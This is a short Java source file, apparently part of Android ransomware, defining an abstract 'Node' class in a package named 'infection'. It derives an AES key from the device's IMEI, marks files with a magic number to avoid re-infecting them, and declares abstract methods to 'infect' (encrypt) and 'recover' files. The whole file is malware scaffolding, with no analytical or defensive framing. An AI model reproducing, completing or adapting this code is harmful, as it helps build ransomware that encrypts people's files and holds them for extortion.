package infection;

import java.io.File;
import java.security.NoSuchAlgorithmException;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

import routine.AndroidDeviceInfo;

public abstract class Node {
	// avoid re-infection
	protected final byte[] magicNumber = { 0x3a, 0x29 };
	protected final int magicPosition = 0;
	protected String key;
	protected Cipher cipher;
	protected SecretKeySpec secretKey;
	
	public Node() {
		// key.length() == 16 (128 bits)
		key = AndroidDeviceInfo.getImei() + "0";
		try {
			cipher = Cipher.getInstance("AES");
		} catch (NoSuchAlgorithmException | NoSuchPaddingException e) {
		}
		secretKey = new SecretKeySpec(key.getBytes(), "AES");
	}

	public Node(File file) {
		this();
		infected(file);
	}

	public Node(File file, boolean r) {
		this();
		if (r)
			recovered(file);
		else
			infected(file);
	}

	public abstract void infected(File file);

	public abstract void recovered(File file);
}
